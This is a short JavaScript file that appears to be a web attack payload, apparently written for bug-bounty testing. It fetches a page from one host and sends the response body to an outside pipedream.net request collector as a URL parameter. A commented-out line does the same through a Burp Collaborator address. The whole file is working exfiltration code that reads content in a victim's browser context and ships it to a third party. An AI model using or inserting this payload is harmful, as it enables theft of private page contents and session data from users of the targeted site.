function loadXMLDoc(theURL)
    {
        if (window.XMLHttpRequest)
        {// code for IE7+, Firefox, Chrome, Opera, Safari, SeaMonkey
            xmlhttp=new XMLHttpRequest();
        }
        else
        {// code for IE6, IE5
            xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
        }
        xmlhttp.onreadystatechange=function()
        {
            if (xmlhttp.readyState==4 && xmlhttp.status==200)
            {
                //loadXMLDoc('https://mf554bwpw39eqcnotvtoi8g7nytprdg.burpcollaborator.net?a='+xmlhttp.responseText);
            }
        }
        xmlhttp.open("GET", theURL, false);
        xmlhttp.send();
    }


    function loadXMLDoc(theURL)
    {
        if (window.XMLHttpRequest)
        {// code for IE7+, Firefox, Chrome, Opera, Safari, SeaMonkey
            xmlhttp=new XMLHttpRequest();
        }
        else
        {// code for IE6, IE5
            xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
        }
        xmlhttp.onreadystatechange=function()
        {
            if (xmlhttp.readyState==4 && xmlhttp.status==200)
            {
                //return xmlhttp.responseText;
            }
        }
        xmlhttp.open("GET", theURL, false);
        xmlhttp.send();
    }
var xmlhttp=false;
loadXMLDoc('https://unmanagedabacus.br2.bughuntr.net/view/f09d4c45-4212-4008-bdcd-9376c8ec813a');

if(xmlhttp==false){  }
else { loadXMLDoc('https://enlftbb365whq.x.pipedream.net?a111='+xmlhttp.responseText) }

